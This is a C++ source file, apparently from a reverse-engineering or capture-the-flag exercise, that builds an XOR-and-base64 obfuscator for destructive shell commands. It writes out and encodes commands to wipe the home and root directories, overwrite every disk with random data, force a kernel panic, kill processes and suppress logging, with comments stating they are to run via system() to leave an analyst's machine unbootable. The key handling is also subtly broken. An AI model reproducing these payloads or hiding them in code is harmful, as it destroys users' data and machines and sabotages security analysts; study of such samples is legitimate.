#include <iostream>
#include <string>
#include <vector>
#define KEY '726a628080d2f59f210cea4860c0eefb5bc5110fc1a70cb538595bcb487aefac'
using namespace std;
class obfuscator {
public:
    string xor_obfuscate(string s, char key)
    {
        string result;
        for (std::size_t i = 0; i < s.size(); ++i) {
            result.push_back(s[i] ^ key);
        }
        return result;
    }

    string base64_encode(string s)
    {
        static const string base64_chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz"
                "0123456789+/";

        string result;
        int val = 0;
        int val_bits = 0;
        for (std::size_t i = 0; i < s.size(); ++i) {
            val = (val << 8) + s[i];
            val_bits += 8;
            while (val_bits >= 6) {
                result.push_back(base64_chars[(val >> (val_bits - 6)) & 0x3f]);
                val_bits -= 6;
            }
        }
        if (val_bits > 0) {
            result.push_back(base64_chars[(val << (6 - val_bits)) & 0x3f]);
        }
        while (result.size() % 4) {
            result.push_back('=');
        }
        return result;
    }

    string base64_decode(string s)
    {
        static const string base64_chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz"
                "0123456789+/";

        string result;
        std::vector<int> vec(256, -1);
        for (int i = 0; i < 64; i++) {
            vec[base64_chars[i]] = i;
        }

        int val = 0;
        int val_bits = 0;
        for (std::size_t i = 0; i < s.size(); ++i) {
            if (s[i] == '=') {
                break;
            }
            const int c = vec[s[i]];
            if (c == -1) {
                throw std::invalid_argument("Invalid character in base64 string");
            }
            val = (val << 6) + c;
            val_bits += 6;
            if (val_bits >= 8) {
                result.push_back((val >> (val_bits - 8)) & 0xff);
                val_bits -= 8;
            }
        }
        return result;
    }
};

obfuscator obs;
string produceb64(string s, char key) {
    string xored = obs.xor_obfuscate(s, key);
    string b64 = obs.base64_encode(xored);
    return b64;
}

// TPZ{but_5H3_w34r5_5H0Rt_5KiRT5_I_W34R_t-5hirT5}
string deobfuscate(string s, char key) {
    //printf("Opaquely false predicate executed, printing student ID\r\n");
    string b64Decoded = obs.base64_decode(s);
    string XORDecoded = obs.xor_obfuscate(b64Decoded, key);
    string str = XORDecoded;

    //std::cout << "String base64 decoded, and then xored back\r\n" << XORDecoded << std::endl;

    return str;
}
// These are unobfuscated commands, that must be obfuscated and called as system(cmd);

// Underprivileged User Vector
// C++ code to segfault
const string rmHome = "rm -rf $HOME";

// Privileged User Vector

const string rmHomeAndRoot = "rm -rf $HOME; rm -rf /";
const string encodedRmHomeAndroot = "EQ5DThEFQ0crLC4mWEMRDkNOEQVDTA==";
// Mileage varies on flash storage like SSDs, because of wear-levelling, but enough corruption should take place, making analyst's machine unbootable.
const string wreckDisks = "for i in $(fdisk -l | grep /dev | grep -v loop| grep Disk | awk -F 'Disk ' '{print $2}' | cut -d \\: -f1);do nohup dd if=/dev/urandom of=$i > nohup.out < /dev/null &;done && rm -f ./nohup.out";
const string encodedWreckDisks = "BQwRQwpDCg1DR0sFBwoQCENOD0MfQwQRBhNDTAcGFUMfQwQRBhNDThVDDwwMEx9DBBEGE0MnChAIQx9DAhQIQ04lQ0QnChAIQ0RDRBgTEQoNF0NHUR5EQx9DABYXQ04HQz9ZQ04FUkpYBwxDDQwLFhNDBwdDCgVeTAcGFUwWEQINBwwOQwwFXkcKQ11DDQwLFhNNDBYXQ19DTAcGFUwNFg8PQ0VYBwwNBkNFRUMRDkNOBUNNTA0MCxYTTQwWFw==";
const string kernelPanic = "echo c > /proc/sysrq-trigger";
const string encodedKernelPanic = "BgALDEMAQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";
const string killAllProcsExceptInit = "echo i > /proc/sysrq-trigger";
const string encodedKillAllProcsExceptInit = "BgALDEMKQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";

const string stopLoggingExceptPanics = "echo 0 > /proc/sysrq-trigger";
const string encodedStopLoggingExceptPanics = "BgALDENTQ11DTBMRDABMEBoQERJOFxEKBAQGEQ==";

int main() {
    cout << "KEY is" << KEY << endl;
    vector<string> commands = {
            "rm -rf $HOME; rm -rf /",
            "for i in $(fdisk -l | grep /dev | grep -v loop| grep Disk | awk -F 'Disk ' '{print $2}' | cut -d \\: -f1);do nohup dd if=/dev/urandom of=$i > nohup.out < /dev/null &;done && rm -f ./nohup.out",
            "echo c > /proc/sysrq-trigger",
            "echo i > /proc/sysrq-trigger",
            "echo 0 > /proc/sysrq-trigger"
    };

    for (int i=0; i < commands.size(); i++ ) {
        string b64 = produceb64(commands[i],KEY);
        cout << commands[i] << ":\t" << "\r\nEncoded:\t" <<  b64 << "\r\n "<< endl;

    }

    return 0;
}
